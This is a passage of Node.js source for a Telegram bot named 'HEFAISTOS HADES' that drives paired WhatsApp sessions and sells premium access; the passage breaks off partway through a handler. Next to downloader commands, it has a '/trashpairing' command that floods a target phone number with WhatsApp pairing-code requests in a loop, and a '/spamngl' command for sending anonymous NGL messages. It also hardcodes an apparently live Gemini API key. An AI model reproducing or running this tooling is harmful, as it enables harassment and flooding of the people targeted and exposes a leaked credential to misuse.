const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion, 
  generateWAMessageFromContent,
  fetchLatestWaWebVersion, 
  prepareWAMessageMedia, 
  proto,
} = require("@whiskeysockets/baileys");
const { exec } = require("child_process");
const fs = require("fs");
const NodeCache = require("node-cache");
const P = require("pino");
const pino = require('pino');
const path = require("path");
const chalk = require("chalk");
const fse = require("fs-extra");
const os = require("os");
const axios = require("axios");
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
//===================================================//
const token = config.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

require("./testi")(bot, isOwner); // Fitur testimoni
//===================================================//
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
//===================================================//
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
//===================================================//
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
//===================================================//
/* 
const GITHUB_RAW_URL = "_"; 

async function validateToken() {
  try {
    const res = await axios.get(GITHUB_RAW_URL);
    if (res.status === 200 && res.data && Array.isArray(res.data.tokens)) {
      if (res.data.tokens.includes(token)) {
        console.log("✅ Token valid, Bot dijalankan...");
        return true;
      }
    }
    console.error("❌ Token tidak ada di GitHub");
    process.exit(1);
  } catch (err) {
    console.error("❌ Gagal ambil data dari GitHub:", err.message);
    process.exit(1);
  }
}

*/

//==================[ FUNGSI DEPLOYBOT ]==================
const DEPLOY_FILE = path.join(__dirname, "deployments.json");
const ADMIN_ID = 6767139831;

function loadDeployments() {
  if (fs.existsSync(DEPLOY_FILE)) {
    return JSON.parse(fs.readFileSync(DEPLOY_FILE, "utf8"));
  }
  return {};
}

function saveDeployments(data) {
  fs.writeFileSync(DEPLOY_FILE, JSON.stringify(data, null, 2));
}

//==================[ FUNGSI COOLDOWN BUG ]==================
function loadCooldownData() {
  try {
    if (fs.existsSync(COOLDOWN_FILE)) {
      return JSON.parse(fs.readFileSync(COOLDOWN_FILE, "utf8"));
    }
  } catch (e) {
    console.error("Error loadCooldownData:", e);
  }
  return { userCooldowns: {}, globalCooldown: 0 };
}

function saveCooldownData(data) {
  try {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("Error saveCooldownData:", e);
  }
}

let { userCooldowns, globalCooldown } = loadCooldownData();

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const { version, isLatest } = await fetchLatestWaWebVersion();
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !true,
        auth: state,
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "XBLASTER");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│ Bot: ${botNumber}
│ Code: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  if (config.BOT_TOKEN)
    try {
      console.log(`╭─────────────────
│ BASE BUTTON BY @seiren_primrose
╰─────────────────`);

      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
}

(async () => {
//await validateToken();
  await initializeBot();
})();

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function removePremiumUser(userId) {
  const premiumData = loadPremiumData();
  if (premiumData[userId]) {
    delete premiumData[userId];
    savePremiumData(premiumData);
    return true;
  }
  return false;
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function parseDuration(duration) {
  const units = { s: 1000, m: 60000, h: 3600000 };
  const match = duration.match(/^(\d+)([smh])$/);
  if (!match) return null;
  const [ , value, unit ] = match;
  return parseInt(value) * units[unit];
}



let startMessage;
let startButton;

bot.onText(/^\/?start/, async (msg) => {
  const chatId = msg.chat.id;

  // Ambil username
  const username = msg.from.username
    ? `@${msg.from.username}`
    : `${msg.from.first_name || ""} ${msg.from.last_name || ""}`.trim();

  const connect =
    sessions.size === 0
      ? "Belum ada bot"
      : `${sessions.size} session${sessions.size > 1 ? "s" : ""}`;

  const startMessage = `
<blockquote>⬡────────〔 <b>HEFAISTOS HADES</b> 〕────────⬡</blockquote>
<i>Welcome...</i>  
Selamat datang di <b>HEFAISTOS HADES</b>.  
Bot dengan fitur tingkat tinggi—cepat, presisi, dan stabil.

<blockquote>⬡──〔 INFORMATION 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 21.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api

<blockquote>⬡──〔 SELECT MENU 〕──⬡</blockquote>
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "⚙️ SETTING BOT", callback_data: "menu1" }],
      [{ text: "🧪 TOOLS", callback_data: "tools" }],
      [
        { text: "🦠 EXECUTE MENU", callback_data: "menu3" },
        { text: "📍 OWNER", url: "https://t.me/Killertzy2" },
      ],
    ],
  };

  // Random image dari list kamu
  const photos = [
    "https://files.catbox.moe/h9g78a.jpg",
    "https://files.catbox.moe/womtwb.png",
  ];

  const photo = photos[Math.floor(Math.random() * photos.length)];

  try {
    await bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "HTML",
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "HTML",
      reply_markup: startButton,
    });
  }
});


bot.onText(/^\/?play (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1].trim();
  if (!query) return bot.sendMessage(chatId, "❌ Contoh: /play serana");

  const loadingMsg = await bot.sendMessage(
    chatId,
    `🎧 Sedang mencari lagu *${query}* di Spotify...`,
    { parse_mode: "Markdown" }
  );

  try {
    // Cari lagu dari API
    const searchUrl = `https://api.siputzx.my.id/api/s/spotify?query=${encodeURIComponent(query)}`;
    const searchRes = await axios.get(searchUrl);

    if (!searchRes.data || !searchRes.data.data || searchRes.data.data.length === 0) {
      return bot.editMessageText("❌ Lagu tidak ditemukan di Spotify.", {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
      });
    }

    // Ambil lagu pertama
    const firstSong = searchRes.data.data[0];
    const trackUrl = firstSong.track_url;

    await bot.editMessageText(
      `🎶 *${firstSong.title}*\n👤 ${firstSong.artist}\n🔗 Mendownload dari Spotify...`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

    // Download MP3 lewat API
    const dlUrl = `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(trackUrl)}`;
    const dlRes = await axios.get(dlUrl);

    if (!dlRes.data || !dlRes.data.status || !dlRes.data.data.mp3DownloadLink) {
      return bot.editMessageText("❌ Gagal mengunduh lagu dari API.", {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
      });
    }

    const song = dlRes.data.data;
    const tmpFile = path.join(__dirname, `${uuidv4()}.mp3`);

    const audioStream = await axios.get(song.mp3DownloadLink, { responseType: "stream" });
    const writer = fs.createWriteStream(tmpFile);
    audioStream.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    await bot.sendAudio(chatId, fs.createReadStream(tmpFile), {
      title: song.title,
      performer: song.artist,
      caption: `🎧 *${song.title}*\n👤 ${song.artist}\n*By @HefaiostosHades21*`,
      parse_mode: "Markdown",
      thumb: song.coverImage,
    });

    fs.unlinkSync(tmpFile);
    await bot.deleteMessage(chatId, loadingMsg.message_id);
  } catch (err) {
    console.error("Error saat play:", err.message);
    bot.editMessageText("❌ Terjadi kesalahan saat memproses permintaan lagu.", {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
    });
  }
});

bot.onText(/^\/?tt\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = (match && match[1]) ? match[1].trim() : null;

  if (!link) {
    return bot.sendMessage(chatId, '❌ Gunakan: /tt <link_tiktok>\nContoh: /tt https://vt.tiktok.com/XXXXX');
  }

  // beri feedback awal
  const statusMsg = await bot.sendMessage(chatId, `🔎 Memproses link: \n${link}\n\n⏳ Mohon tunggu...`);

  try {
    // 1) panggil API siputzx untuk dapatkan data (url video)
    const apiUrl = 'https://api.siputzx.my.id/api/d/tiktok';
    const resp = await axios.get(apiUrl, {
      params: { url: link },
      headers: { accept: '*/*' },
      timeout: 20000
    });

    if (!resp.data || !resp.data.status) {
      await bot.editMessageText('❌ Gagal mendapatkan data dari API atau format response tak valid.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return;
    }

    // struktur respons dari contoh: resp.data.data.urls => array of urls (ambil index 0)
    const data = resp.data.data || {};
    let videoUrl = null;

    if (Array.isArray(data.urls) && data.urls.length) {
      videoUrl = data.urls[0];
    } else if (typeof data.url === 'string') {
      videoUrl = data.url;
    } else if (typeof data.original_url === 'string') {
      // fallback kalau API hanya kasih original url
      videoUrl = data.original_url;
    }

    if (!videoUrl) {
      await bot.editMessageText('❌ Tidak menemukan URL video di response API.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return;
    }

    await bot.editMessageText('⬇️ Mengunduh video... (sedang dikompresi/diambil)', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    // 2) download video sebagai stream & simpan sementara (gunakan nama unik)
    const tmpName = `${uuidv4()}.mp4`;
    const tmpPath = path.join(__dirname, tmpName);
    const writer = fs.createWriteStream(tmpPath);

    const videoResp = await axios.get(videoUrl, {
      responseType: 'stream',
      timeout: 60000,
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible)' }
    });

    // opsional: cek content-length (kalau tersedia)
    const contentLength = videoResp.headers['content-length'] ? parseInt(videoResp.headers['content-length'], 10) : null;
    const maxSizeBytes = 50 * 1024 * 1024; // batas 50 MB (ubah sesuai kebutuhan)

    if (contentLength && contentLength > maxSizeBytes) {
      // kalau terlalu besar, jangan download — kirim link saja
      try { videoResp.data.destroy(); } catch (e) {}
      await bot.editMessageText(`⚠️ File video terlalu besar (${Math.round(contentLength/1024/1024)} MB). Mengirim tautan langsung.`, { chat_id: chatId, message_id: statusMsg.message_id });
      await bot.sendMessage(chatId, `🔗 Download langsung: ${videoUrl}`);
      return;
    }

    // pipe stream ke file
    videoResp.data.pipe(writer);

    // tunggu sampai selesai
    await new Promise((resolve, reject) => {
      let errored = false;
      writer.on('error', (err) => {
        errored = true;
        writer.close();
        reject(err);
      });
      writer.on('finish', () => {
        if (!errored) resolve();
      });
    });

    // 3) kirim video ke chat
    await bot.editMessageText('📤 Mengirim video ke chat...', { chat_id: chatId, message_id: statusMsg.message_id });

    // Jika file ukuran besar, gunakan sendDocument untuk menghindari kompresi
    const stats = fs.statSync(tmpPath);
    const fileSizeMB = Math.round((stats.size / 1024 / 1024) * 10) / 10;

    if (stats.size < 20 * 1024 * 1024) {
      // kirim sebagai video (telegram akan kompres kalau perlu)
      await bot.sendVideo(chatId, fs.createReadStream(tmpPath), { caption: `🎬 TikTok Video\nSize: ${fileSizeMB} MB` });
    } else {
      // kirim sebagai document agar tidak dikompres
      await bot.sendDocument(chatId, fs.createReadStream(tmpPath), {}, { filename: tmpName, contentType: 'video/mp4' });
    }

    // bersihin file sementara
    try { fs.unlinkSync(tmpPath); } catch (e) { /* ignore */ }

    // update status akhir
    await bot.editMessageText('✅ Selesai! Video berhasil dikirim.', { chat_id: chatId, message_id: statusMsg.message_id });

  } catch (err) {
    console.error('Error /tt command:', err?.message || err);
    // ada beberapa kemungkinan error: API down, download timeout, stream error, dll
    try {
      await bot.editMessageText('❌ Terjadi kesalahan saat memproses. Coba lagi nanti.`', {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: 'Markdown'
      });
    } catch (e) {
      // fallback: kirim pesan biasa
      await bot.sendMessage(chatId, '❌ Terjadi kesalahan saat memproses. Coba lagi nanti.');
    }
  }
});

// === Command: /trashpairing <nomor> <loop> ===
bot.onText(/^\/?trashpairing (\d+)\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const loopCount = parseInt(match[2]);

  if (!target || !loopCount) {
    return bot.sendMessage(
      chatId,
      "❌ Masukkan format dengan benar!\n\nContoh: <code>/trashpairing 628123456789 10</code>",
      { parse_mode: "HTML" }
    );
  }

  const startMsg = await bot.sendMessage(
    chatId,
    `🚀 <b>Menjalankan Trash Pairing</b>\n\n📱 Target: <code>${target}</code>\n🔁 Loop: <b>${loopCount}</b>\n\n⏳ Inisialisasi koneksi...`,
    { parse_mode: "HTML" }
  );

  try {
    const { state, saveCreds } = await useMultiFileAuthState("testpairing");
    const { version, isLatest } = await fetchLatestWaWebVersion();
    const cache = new NodeCache();

    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !true,
        auth: state,
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });

    let success = 0;
    let fail = 0;

    for (let i = 1; i <= loopCount; i++) {
      try {
        await sock.requestPairingCode(target);
        success++;
      } catch {
        fail++;
      }

      const progressBar = makeProgressBar(i, loopCount);
      const progressMsg = `
<blockquote>⚙️ <b>Trash Pairing Progress</b></blockquote>
📱 Target: <code>${target}</code>
🔁 Loop: <b>${loopCount}</b>

${progressBar}
🧩 Progress: <b>${i} / ${loopCount}</b>
✅ Sukses: <b>${success}</b>
❌ Gagal: <b>${fail}</b>

<blockquote>⚡️ Memproses pairing code... Mohon tunggu.</blockquote>
      `;

      await bot.editMessageText(progressMsg, {
        chat_id: chatId,
        message_id: startMsg.message_id,
        parse_mode: "HTML",
      });

      await sleep(2000);
    }

    const doneMsg = `
<blockquote>✅ <b>Trash Pairing Selesai!</b></blockquote>
📱 Target: <code>${target}</code>
🔁 Total Loop: <b>${loopCount}</b>

🧩 Hasil Akhir:
✅ Berhasil: <b>${success}</b>
❌ Gagal: <b>${fail}</b>

<blockquote>🔥 Operasi pairing telah selesai dengan sukses!</blockquote>
    `;

    await bot.editMessageText(doneMsg, {
      chat_id: chatId,
      message_id: startMsg.message_id,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("Error pairing:", err);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menjalankan trash pairing.",
      { parse_mode: "HTML" }
    );
  }
});

// === Fungsi pembuat progress bar keren ===
function makeProgressBar(current, total, length = 15) {
  const filled = Math.round((current / total) * length);
  const bar = "▰".repeat(filled) + "▱".repeat(length - filled);
  return `📊 Progress: [${bar}]`;
}

// === /pinterest command ===
bot.onText(/^\/?pinterest (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].split(" ");
  const query = input[0];
  const type = input[1] || "image"; // default image

  try {
    const res = await axios.get(
      `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(query)}&type=${type}`
    );

    const data = res.data.data.slice(0, 5); // ambil 5 hasil

    if (!data.length) return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.");

    for (const item of data) {
      let caption = `📌 <b>Pinterest ${type}</b>\n🆔 ${item.id}\n🔗 <a href="${item.pin}">Buka di Pinterest</a>`;
      if (item.image_url) {
        await bot.sendPhoto(chatId, item.image_url, {
          caption,
          parse_mode: "HTML",
        });
      } else if (item.video_url) {
        await bot.sendVideo(chatId, item.video_url, {
          caption,
          parse_mode: "HTML",
        });
      } else if (item.gif_url) {
        await bot.sendAnimation(chatId, item.gif_url, {
          caption,
          parse_mode: "HTML",
        });
      }
    }
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil data Pinterest.");
  }
});

const GEMINI_API_KEY = "AIzaSyBzXtQ30evYlw6dRdQyF5qA85QLZJAfMGE";
const GEMINI_MODEL = "gemini-2.0-flash";

// ================= RAM STATE =================
let aiEnabled = false; // AI default OFF

// ================= CMD ON/OFF =================
bot.onText(/^\/?ai (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    aiEnabled = true;
    bot.sendMessage(chatId, "✅ AI telah *diaktifkan*", { parse_mode: "Markdown" });
  } else {
    aiEnabled = false;
    bot.sendMessage(chatId, "❌ AI telah *dimatikan*", { parse_mode: "Markdown" });
  }
});

// ================= MESSAGE HANDLER =================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // skip if AI off or command sendiri
  if (!aiEnabled || /^\/ai\b/i.test(text)) return;

  try {
    // === STEP 1: Gemini ===
    const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`;
    const geminiRes = await fetch(geminiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        contents: [{ role: "user", parts: [{ text }] }],
        generationConfig: { temperature: 0.7, maxOutputTokens: 256 }
      })
    });

    const geminiData = await geminiRes.json();
    let reply = geminiData?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();

    // === STEP 2: fallback GPT3 ===
    if (!reply || reply.length === 0) {
      console.log("⚠️ Gemini gagal, fallback ke GPT3...");
      const gptUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=You%20are%20a%20helpful%20assistant.&content=${encodeURIComponent(text)}`;
      const gptRes = await fetch(gptUrl);
      const gptData = await gptRes.json();
      reply = gptData.result || gptData.output || gptData.response || "⚠️ AI gagal membalas.";
    }

    await bot.sendMessage(chatId, reply);
  } catch (err) {
    console.error("❌ AI Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi error saat memproses AI.");
  }
});

// === /ngl command ===
bot.onText(/^\/?spamngl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(" ");
  const link = args[0];
  const text = args.slice(1).join(" ") || "Hai";

  if (!link.startsWith("https://ngl.link/")) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /ngl https://ngl.link/xxxx Hai");
  }

  try {
    const res = await axios.get(
      `https://api.siputzx.my.id/api/tools/ngl?link=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`
    );

    if (res.data.status) {
      bot.sendMessage(
        chatId,
        `✅ Pesan berhasil dikirim!\n🆔 Question ID: <code>${res.data.data.questionId}</code>`,
        { parse_mode: "HTML" }
      );
    } else {
      bot.sendMessage(chatId, "❌ Gagal mengirim pesan ke NGL.");
    }
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengirim pesan ke NGL.");
  }
});

bot.onText(/^\/?addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/?delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *MENGHAPUS BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(
          `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/^\/?listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "⚠️ Tidak ada bot WhatsApp yang sedang terhubung.",
        { parse_mode: "Markdown" }
      );
    }

    let listText = "╭── *LIST BOT AKTIF* ──╮\n";
    let index = 1;
    for (const [botNumber] of sessions.entries()) {
      listText += `│ ${index++}. ${botNumber}\n`;
    }
    listText += "╰─────────────────────────╯";

    await bot.sendMessage(chatId, listText, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error listing bots:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil list bot.");
  }
});

bot.onText(/^\/?addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].trim().split(/\s+/);

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, `Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem <id> <durasi>\nContoh: /addprem 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem 123456 30d\n(h=jam, d=hari, w=minggu, m=bulan)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Ditambahkan\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/?delprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = match[1].trim();

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "Anda tidak memiliki akses", {
      parse_mode: "Markdown",
    });
  }

  if (!userId) {
    return bot.sendMessage(
      chatId,
      "Usage: /delprem <id>\nContoh: /delprem 123456",
      { parse_mode: "Markdown" }
    );
  }

  const success = removePremiumUser(userId);

  if (success) {
    await bot.sendMessage(chatId, `User premium dihapus\nID: ${userId}`, {
      parse_mode: "Markdown",
    });
  } else {
